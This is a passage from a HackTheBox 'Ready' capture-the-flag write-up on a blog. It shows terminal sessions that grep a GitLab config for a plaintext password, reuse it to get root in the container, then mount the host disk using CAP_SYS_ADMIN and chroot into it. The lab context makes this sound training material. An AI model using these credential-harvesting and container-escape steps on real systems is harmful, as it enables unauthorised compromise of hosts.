</span><span class="gp">gitlab.rb:#</span><span class="s2">###! **Master password should have the same value defined in
</span><span class="gp">gitlab.rb:#</span><span class="s2">###!   redis['password'] to enable the instance to transition to/from
</span><span class="gp">gitlab.rb:#</span><span class="w"> </span><span class="s2">redis['master_password'] = 'redis-password-goes-here'
</span><span class="gp">gitlab.rb:#</span><span class="w"> </span><span class="s2">geo_secondary['db_password'] = nil
</span><span class="gp">gitlab.rb:#</span><span class="w"> </span><span class="s2">geo_postgresql['pgbouncer_user_password'] = nil
</span><span class="gp">gitlab.rb:#</span><span class="w">     </span><span class="s2">password: PASSWORD
</span><span class="gp">gitlab.rb:#</span><span class="s2">##! generate this with </span><span class="sb">`</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'$password + $username'</span> | <span class="nb">md5sum</span><span class="sb">`</span><span class="s2">
</span><span class="gp">gitlab.rb:#</span><span class="w"> </span><span class="s2">pgbouncer['auth_query'] = 'SELECT username, password FROM public.pg_shadow_lookup(</span><span class="nv">$1</span><span class="s2">)'
</span><span class="gp">gitlab.rb:#</span><span class="w">     </span><span class="s2">password: MD5_PASSWORD_HASH
</span><span class="gp">gitlab.rb:#</span><span class="w"> </span><span class="s2">postgresql['pgbouncer_user_password'] = nil
</span><span class="gp">git@gitlab:/opt/backup$</span><span class="w">
</span></pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">docker-compose.yml</code> references the <code class="language-plaintext highlighter-rouge">root_pass</code> file in the root directory, but it also looks like <code class="language-plaintext highlighter-rouge">gitlab.rb</code> has quite a few hits on password as well.</p><p>Now we drill down to find <code class="language-plaintext highlighter-rouge">password</code> in <code class="language-plaintext highlighter-rouge">gitlab.rb</code>, but we want to remove results that start with a <code class="language-plaintext highlighter-rouge">#</code> since those are comments in the file and don’t mean anything to us:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">git@gitlab:/opt/backup$</span><span class="w"> </span><span class="nb">grep</span> <span class="s1">'password'</span> gitlab.rb | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'^#'</span>
<span class="gp">grep 'password' gitlab.rb | grep -v '^#</span><span class="s1">'
</span><span class="gp">gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#</span><span class="s1">h"
</span></pre></table></code></div></div><p>That shows us something interesting. Perhaps we can use this to get docker root:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">git@gitlab:/opt/backup$</span><span class="w"> </span>su - root
<span class="go">su - root
</span><span class="gp">Password: wW59U!ZKMbG9+*#</span>h
<span class="go">
</span><span class="gp">root@gitlab:~#</span><span class="w">
</span></pre></table></code></div></div><p>Success!</p><hr /><h2 id="root"><span class="mr-2"><strong>Root</strong></span><a href="#root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Admittedly, I started looking at breakout attempts before I privesc’d to docker root. When reviewing the LinePEAS output, it showed caps that were enabled. Most of what I found on the web would reference a pretty simple way to gain root on the host box with certain capabilities enabled, which in this case looked like everything. I eventually fell on this <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_sys_admin">hacktricks</a> which, with SYS_ADMIN capability enabled, could allow the docker container to “mount the host disk and access it freely.”</p><p>Oh and if you want to see what capabilites are enabled for you, just run <code class="language-plaintext highlighter-rouge">capsh --print</code></p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="gp">root@gitlab:~#</span><span class="w"> </span>capsh <span class="nt">--print</span>
<span class="go">capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eip
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
</span><span class="gp">root@gitlab:~#</span><span class="w">
</span></pre></table></code></div></div><p>Following along wih the instructions from the site:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="gp">root@gitlab:/#</span><span class="w"> </span>fdisk <span class="nt">-l</span>
<span class="go">---[snip]---
Device        Start      End  Sectors Size Type
/dev/sda1      2048     4095     2048   1M BIOS boot
/dev/sda2      4096 37746687 37742592  18G Linux filesystem
/dev/sda3  37746688 41940991  4194304   2G Linux swap
</span><span class="gp">root@gitlab:/#</span><span class="w"> </span><span class="nb">mkdir</span> /mnt/hole
<span class="go">mkdir /mnt/hole
</span><span class="gp">root@gitlab:/#</span><span class="w"> </span><span class="nb">cd</span> /mnt                
<span class="go">cd /mnt
</span><span class="gp">root@gitlab:/mnt#</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">ls
hole
</span><span class="gp">root@gitlab:/mnt#</span><span class="w"> </span>mount /dev/sda2 hole
<span class="go">mount /dev/sda2 hole
</span><span class="gp">root@gitlab:/mnt#</span><span class="w"> </span><span class="nb">cd </span>hole
<span class="go">cd hole
</span><span class="gp">root@gitlab:/mnt/hole#</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">ls
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
</span><span class="gp">root@gitlab:/mnt/hole#</span><span class="w"> </span><span class="nb">chroot</span> ./ bash
<span class="go">chroot ./ bash
</span><span class="gp">root@gitlab:/#</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">whoami
root
</span><span class="gp">root@gitlab:/#</span><span class="w"> </span><span class="nb">cd</span> /root
<span class="go">cd /root
</span><span class="gp">root@gitlab:~#</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">ls
docker-gitlab  ready-channel  root.txt  snap
</span><span class="gp">root@gitlab:~#</span><span class="w">
</span></pre></table></code></div></div><p>And there it is. That’s <strong>Ready</strong>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/gitlab/" class="post-tag no-text-decoration" >gitlab</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >docker</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Ready - Gore-Ez-Knee&amp;url=https://gore-ez-knee.github.io/posts/ready/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Ready - Gore-Ez-Knee&amp;u=https://gore-ez-knee.github.io/posts/ready/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://gore-ez-knee.github.io/posts/ready/&amp;text=Ready - Gore-Ez-Knee" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/kali-cloud-novnc/">Stream Kali Linux to your Browser from AWS</a><li><a href="/posts/backup-restore-gitlab/">Backup/Restore GitLab</a><li><a href="/posts/getting-started-cybersecurity/">Intro to Cybersecurity</a><li><a href="/posts/htb-ca-2022-writeup-table/">HTB Cyber Apocalypse CTF - Table of Write-ups</a><li><a href="/posts/elastic-install/">Quickstart Elastic Stack</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/gitlab/">gitlab</a> <a class="post-tag" href="/tags/ubuntu/">ubuntu</a> <a class="post-tag" href="/tags/docker-compose/">docker-compose</a> <a class="post-tag" href="/tags/elastic/">elastic</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a> <a class="post-tag" href="/tags/evt/">evt</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/backup-restore-gitlab/"><div class="card-body"> <em class="timeago small" data-ts="1654354800" > 2022-06-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Backup/Restore GitLab</h3><div class="text-muted small"><p> Do you have a small GitLab container running on an instance in AWS for yourself or a small team? Have you ever needed to back-up GitLab and move it to another machine wether that be on another inst...</p></div></div></a></div><div class="card"> <a href="/posts/htb-ca-2022-forensics-puppeteer/"><div class="card-body"> <em class="timeago small" data-ts="1652556600" > 2022-05-14 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Cyber Apocalypse CTF - Forensics - Puppeteer</h3><div class="text-muted small"><p> Challenge Info Difficulty: ★☆☆☆ Planet Longhir is known for it’s top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced one in ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-ca-2022-writeup-table/"><div class="card-body"> <em class="timeago small" data-ts="1652643000" > 2022-05-15 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Cyber Apocalypse CTF - Table of Write-ups</h3><div class="text-muted small"><p> I’m hosting the files I was able to get on DropBox in case anyone wanted to try the challenges on their own after the fact. I’ll add more write-ups as I find them. Web Challenge Na...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/cybercrafted/" class="btn btn-outline-primary" prompt="Older"><p>Cybercrafted</p></a> <a href="/posts/ubuntu-server-setup/" class="btn btn-outline-primary" prompt="Newer"><p>Ubuntu Server Setup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/gore_ez_knee">Gore-Ez-Knee</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/gitlab/">gitlab</a> <a class="post-tag" href="/tags/ubuntu/">ubuntu</a> <a class="post-tag" href="/tags/docker-compose/">docker-compose</a> <a class="post-tag" href="/tags/elastic/">elastic</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a> <a class="post-tag" href="/tags/evt/">evt</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-BJ7S2G5H9F"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-BJ7S2G5H9F'); }); </script>
